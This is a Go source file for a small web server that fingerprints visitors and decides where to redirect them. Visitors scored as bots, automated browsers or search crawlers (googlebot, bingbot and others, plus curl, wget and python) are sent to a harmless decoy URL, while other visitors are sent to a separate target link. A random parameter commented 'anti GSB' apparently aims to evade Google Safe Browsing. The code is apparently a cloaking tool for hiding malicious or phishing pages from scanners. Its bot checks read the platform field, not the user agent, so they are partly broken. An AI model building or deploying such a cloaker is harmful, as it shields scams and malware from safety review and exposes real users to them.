package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type FPData struct {
	Webdriver bool   `json:"webdriver"`
	Lang      string `json:"lang"`
	Platform  string `json:"platform"`
	Screen    string `json:"screen"`
	TZ        string `json:"tz"`
}

// ===== SIMPLE CACHE =====
type CacheItem struct {
	Value   string
	Expires time.Time
}

var cache = make(map[string]CacheItem)
var mu sync.Mutex

func getCache(key string) (string, bool) {
	mu.Lock()
	defer mu.Unlock()
	item, ok := cache[key]
	if !ok || time.Now().After(item.Expires) {
		return "", false
	}
	return item.Value, true
}

func setCache(key, value string, ttl time.Duration) {
	mu.Lock()
	defer mu.Unlock()
	cache[key] = CacheItem{Value: value, Expires: time.Now().Add(ttl)}
}

// ===== RATE LIMIT =====
var rate = make(map[string]int)

func allow(ip string) bool {
	mu.Lock()
	defer mu.Unlock()

	rate[ip]++
	if rate[ip] == 1 {
		go func() {
			time.Sleep(10 * time.Second)
			mu.Lock()
			delete(rate, ip)
			mu.Unlock()
		}()
	}

	return rate[ip] <= 5
}

// ===== DETECTION =====
func isBotUA(ua string) bool {
	bots := []string{"bot", "crawler", "spider", "curl", "wget", "python"}
	for _, b := range bots {
		if strings.Contains(ua, b) {
			return true
		}
	}
	return false
}

func isCrawler(ua string) bool {
	crawlers := []string{"googlebot", "bingbot", "yandex", "duckduckbot"}
	for _, c := range crawlers {
		if strings.Contains(ua, c) {
			return true
		}
	}
	return false
}

func isFakeMobile(ua string) bool {
	if strings.Contains(ua, "iphone") && strings.Contains(ua, "windows") {
		return true
	}
	return false
}

// ===== HANDLER =====
func fpHandler(w http.ResponseWriter, r *http.Request) {

	ip := r.RemoteAddr

	if !allow(ip) {
		http.Error(w, "rate limited", http.StatusTooManyRequests)
		return
	}

	// cache check
	if val, ok := getCache(ip); ok {
		json.NewEncoder(w).Encode(map[string]string{"redirect": val})
		return
	}

	var body struct {
		FP FPData `json:"fp"`
		DL string `json:"dl"`
		BL string `json:"bl"`
	}

	json.NewDecoder(r.Body).Decode(&body)

	ua := strings.ToLower(body.FP.Platform)

	score := 0

	if body.FP.Webdriver {
		score += 60
	}

	if body.FP.TZ == "" {
		score += 30
	}

	if isBotUA(ua) {
		score += 40
	}

	if isCrawler(ua) {
		score += 50
	}

	if isFakeMobile(ua) {
		score += 40
	}

	mode := os.Getenv("MODE")
	limit := 60

	if mode == "light" {
		limit = 80
	}
	if mode == "paranoid" {
		limit = 40
	}

	redirect := body.DL

	if redirect == "" {
		redirect = "https://google.com"
	}

	if body.BL == "" {
		body.BL = "https://example.com"
	}

	if score >= limit {
		redirect = body.BL
	}

	// anti GSB param
	if strings.Contains(redirect, "?") {
		redirect = redirect + "&r=" + fmt.Sprint(time.Now().UnixNano())
	} else {
		redirect = redirect + "?r=" + fmt.Sprint(time.Now().UnixNano())
	}

	// cache result
	setCache(ip, redirect, 5*time.Minute)

	json.NewEncoder(w).Encode(map[string]string{
		"redirect": redirect,
	})
}

func main() {

	http.HandleFunc("/fp", fpHandler)

	server := &http.Server{
		Addr:         ":8080",
		ReadTimeout:  2 * time.Second,
		WriteTimeout: 2 * time.Second,
	}

	server.ListenAndServe()
}
